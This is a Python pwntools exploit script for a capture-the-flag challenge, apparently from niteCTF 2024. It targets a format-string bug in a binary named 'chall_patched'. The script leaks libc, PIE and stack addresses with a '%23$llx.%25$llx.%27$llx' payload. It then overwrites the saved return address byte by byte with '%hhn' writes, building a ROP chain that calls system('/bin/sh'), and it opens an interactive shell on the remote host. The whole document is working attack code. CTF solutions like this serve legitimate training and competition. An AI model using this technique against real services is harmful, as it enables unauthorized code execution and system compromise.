#!/usr/bin/env python3

from pwn import *

exe = ELF("./chall_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-linux-x86-64.so.2")

context.binary = exe


def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.GDB:
            gdb.attach(r)
    else:
        r = remote("print-the-gifts.chals.nitectf2024.live", 1337, ssl=True)

    return r

def write_byte(r: process, to, b):
    r.sendline(b'y')
    r.sendline(b"A"*16 + p64(to))
    r.recvuntil(b">")
    length_gen = ("55%" + str(b) +"x").encode() if b else b"55"
    r.sendline(length_gen + b"%10$hhn") 
    
def write_quadword(r, to, qw):
    
    for i in range(8):
        write_byte(r, to+i, qw & 0xff)
        qw >>= 8 
        

def main():
    r = conn()
    
    LIBC_POP_RDI = 0x00000000000277e5
    BINARY_RET = 0x0000000000001016

    r.sendline(b"%23$llx.%25$llx.%27$llx")
    r.recvuntil(b"Santa brought you a ")
    libc_leak = int(r.recvuntil(b'.', drop=True).decode(),16)
    pie_leak = int(r.recvuntil(b'.', drop=True).decode(),16)
    stack_leak = int(r.recvuntil(b'do', drop=True).decode(),16)
    
    libc.address = libc_leak - 0x2724a
    exe.address = pie_leak - 0x1199
    return_ptr = stack_leak - 272
    info(f"libc base @ {hex(libc.address)}")
    info(f"pie @ {hex(exe.address)}")
    info(f"return pointer @ {hex(return_ptr)}")

    write_quadword(r, return_ptr, libc.address + LIBC_POP_RDI)
    write_quadword(r, return_ptr+8, next(libc.search('/bin/sh')))
    write_quadword(r, return_ptr+16, exe.address + BINARY_RET)
    write_quadword(r, return_ptr+24, libc.sym.system)

    r.sendline(b"n")
    
    info("Enjoy your shell :D")
    r.interactive()


if __name__ == "__main__":
    main()
